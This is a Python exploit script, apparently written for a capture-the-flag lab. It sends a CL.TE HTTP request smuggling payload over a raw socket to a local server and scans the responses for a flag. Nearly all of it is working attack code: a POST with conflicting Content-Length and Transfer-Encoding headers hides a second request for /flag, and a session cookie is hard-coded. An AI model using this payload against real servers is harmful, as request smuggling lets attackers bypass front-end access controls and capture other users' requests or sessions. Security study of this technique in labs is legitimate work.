import socket
import time
import re

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 32900
SESSION_COOKIE = "session=58P3X-jvhvlu5K4TJVpzuTVwTbpzpmq1-GjZz0CtaeM"

def send_raw_request(payload):
    """Send raw HTTP request and return response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.sendall(payload.encode('utf-8'))
        
        response = b""
        sock.settimeout(2)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        
        sock.close()
        return response.decode('utf-8', errors='replace')
    except Exception as e:
        return f"Error: {str(e)}"

def search_flag(response):
    """Search for FLAG{} pattern in response"""
    flags = re.findall(r'FLAG\{[^}]+\}', response)
    if flags:
        print(f"\n{'='*60}")
        print(f"[!!!] FLAG FOUND: {flags[0]}")
        print(f"{'='*60}\n")
        return flags[0]
    return None

print("[*] Starting HTTP Request Smuggling Tests")
print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
print(f"[*] Session Cookie: {SESSION_COOKIE}\n")

# Test 1: CL.TE Smuggling - /flag endpoint
print("\n" + "="*60)
print("[TEST 1] CL.TE Smuggling - Smuggle GET /flag")
print("="*60)
print("[*] Strategy: Front-end reads Content-Length, back-end reads Transfer-Encoding")

# CL.TE: Content-Length says body is short, but Transfer-Encoding chunks include smuggled request
smuggled_request = "GET /flag HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: " + SESSION_COOKIE + "\r\n\r\n"
cl_te_payload = (
    "POST / HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    f"Cookie: {SESSION_COOKIE}\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    f"{smuggled_request}"
)

print(f"[*] Sending CL.TE payload (smuggling GET /flag)...")
response = send_raw_request(cl_te_payload)
print(f"[+] Response length: {len(response)} bytes")
print(f"[+] Response:\n{response}")
search_flag(response)

time.sleep(0.5)

